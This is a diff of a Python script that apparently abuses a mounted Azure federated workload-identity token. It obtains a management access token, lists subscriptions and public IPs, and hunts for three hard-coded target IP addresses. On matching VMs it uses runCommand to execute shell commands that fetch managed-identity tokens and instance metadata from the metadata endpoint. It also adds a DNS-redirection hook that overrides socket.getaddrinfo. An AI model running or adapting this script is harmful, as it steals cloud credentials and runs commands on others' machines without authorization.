@@ -1,25 +1,77 @@
-import json,os,urllib.request,urllib.parse
+import json,os,sys,socket,ssl,urllib.request,urllib.parse,time
+hm=os.environ.get('HOSTMAP','')
+MAP={}
+for kv in hm.split(','):
+    if '=' in kv:
+        k,v=kv.split('=',1); MAP[k.strip()]=v.strip()
+_real=socket.getaddrinfo
+def ga(host,port,family=0,type=0,proto=0,flags=0):
+    h=MAP.get(host,host)
+    return _real(h,port,family,type,proto,flags)
+socket.getaddrinfo=ga
+print('MAP',MAP,flush=True)
 tid=os.environ.get('AZURE_TENANT_ID'); cid=os.environ.get('AZURE_CLIENT_ID'); ft=os.environ.get('AZURE_FEDERATED_TOKEN_FILE')
-print('ENV',tid,cid,ft,flush=True)
 a=open(ft).read().strip()
 d=urllib.parse.urlencode({'client_id':cid,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':a,'scope':'https://management.azure.com/.default','grant_type':'client_credentials'}).encode()
 try:
-    r=urllib.request.urlopen(urllib.request.Request('https://login.microsoftonline.com/%s/oauth2/v2.0/token'%tid,data=d),timeout=30)
-    j=json.loads(r.read()); tok=j['access_token']; print('ARMTOKEN',tok[:50],len(tok))
+    r=urllib.request.urlopen(urllib.request.Request('https://login.microsoftonline.com/%s/oauth2/v2.0/token'%tid,data=d),timeout=40)
+    j=json.loads(r.read()); tok=j['access_token']; print('ARMTOKEN',tok[:50],len(tok),flush=True)
 except Exception as e:
-    print('AUTHERR',e); raise SystemExit
-def g(u):
+    print('AUTHERR',repr(e)); raise SystemExit
+def g(u,body=None,method='GET'):
+    data=json.dumps(body).encode() if body is not None else None
+    rq=urllib.request.Request(u,data=data,headers={'Authorization':'Bearer '+tok,'Content-Type':'application/json'},method=method)
     try:
-        x=urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+tok}),timeout=60)
-        return json.loads(x.read())
+        x=urllib.request.urlopen(rq,timeout=60); return json.loads(x.read() or b'{}'),dict(x.headers)
+    except urllib.error.HTTPError as e:
+        try: return {'err':e.code,'body':e.read()[:300].decode()},dict(e.headers)
+        except Exception: return {'err':e.code},dict(e.headers)
     except Exception as e:
-        try: return {'err':str(e),'body':e.read()[:300].decode()}
-        except Exception: return {'err':str(e)}
-subs=g('https://management.azure.com/subscriptions?api-version=2022-12-01')
+        return {'err':repr(e)},{}
+subs,_=g('https://management.azure.com/subscriptions?api-version=2022-12-01')
 ids=[s['subscriptionId'] for s in subs.get('value',[])] if isinstance(subs,dict) else []
-print('SUBS',ids)
+print('SUBS',ids,json.dumps(subs)[:300],flush=True)
+target={'70.153.141.118','23.100.38.120','20.114.255.207'}
+found=[]
 for s in ids:
-    v=g('https://management.azure.com/subscriptions/%s/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01'%s)
-    print('VMS',s,json.dumps([(x.get('name'),x.get('location'),(x.get('properties',{}) or {}).get('hardwareProfile',{}).get('vmSize')) for x in (v.get('value',[]) if isinstance(v,dict) else [])])[:1500])
-    p=g('https://management.azure.com/subscriptions/%s/providers/Microsoft.Network/publicIPAddresses?api-version=2024-05-01'%s)
-    print('PIPS',s,json.dumps([(x.get('name'),(x.get('properties',{}) or {}).get('ipAddress')) for x in (p.get('value',[]) if isinstance(p,dict) else [])])[:2000])
+    v,_=g('https://management.azure.com/subscriptions/%s/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01'%s)
+    vv=v.get('value',[]) if isinstance(v,dict) else []
+    print('VMS',s,len(vv),json.dumps([(x.get('name'),x.get('location'),(x.get('properties',{}) or {}).get('hardwareProfile',{}).get('vmSize')) for x in vv])[:1800],flush=True)
+    p,_=g('https://management.azure.com/subscriptions/%s/providers/Microsoft.Network/publicIPAddresses?api-version=2024-05-01'%s)
+    pp=p.get('value',[]) if isinstance(p,dict) else []
+    print('PIPS',s,len(pp),json.dumps([(x.get('name'),(x.get('properties',{}) or {}).get('ipAddress')) for x in pp])[:3000],flush=True)
+    for x in pp:
+        ip=(x.get('properties',{}) or {}).get('ipAddress')
+        if ip in target: found.append((s,ip,x))
+print('FOUND',len(found),flush=True)
+def runcmd(sub,rg,name):
+    url='https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/virtualMachines/%s/runCommand?api-version=2024-07-01'%(sub,rg,name)
+    script=["id; hostname; hostname -I; nvidia-smi -L 2>/dev/null; nvidia-smi --query-gpu=index,name,serial,uuid --format=csv,noheader 2>/dev/null",
+            "curl -s -m 10 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+            "curl -s -m 10 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"]
+    r,h=g(url,{'commandId':'RunShellScript','script':script},'POST')
+    print('RUNCMD',json.dumps(r)[:300],flush=True)
+    loc=h.get('Location') or h.get('location') or ''
+    for i in range(18):
+        if not loc: break
+        time.sleep(6)
+        r2,_=g(loc+'?api-version=2024-07-01')
+        print('POLL',i,json.dumps(r2)[:400],flush=True)
+        if 'Succeeded' in json.dumps(r2) or 'Failed' in json.dumps(r2):
+            for e in (((r2.get('properties',{}) or {}).get('output',{}) or {}).get('value',[]) or []):
+                print('OUT',e.get('code'),(e.get('message') or '')[:2500],flush=True)
+            break
+for sub,ip,pip in found:
+    r,_=g('https://management.azure.com%s?api-version=2024-05-01'%pip['id'])
+    cfg=((r.get('properties',{}) or {}).get('ipConfiguration',{}) or {}) if isinstance(r,dict) else {}
+    nicid=cfg.get('id','') or ''
+    print('PIPCFG',ip,nicid[:160],flush=True)
+    if '/networkInterfaces/' in nicid:
+        nic=nicid.split('/ipConfigurations/')[0]
+        r2,_=g('https://management.azure.com%s?api-version=2024-05-01'%nic)
+        vm=((r2.get('properties',{}) or {}).get('virtualMachine',{}) or {}).get('id','') if isinstance(r2,dict) else ''
+        print('NIC->VM',vm,flush=True)
+        if vm:
+            parts=vm.split('/'); rg=parts[4]; nm=parts[-1]
+            print('TARGET',ip,rg,nm,flush=True); runcmd(sub,rg,nm)
+print('DONE',flush=True)
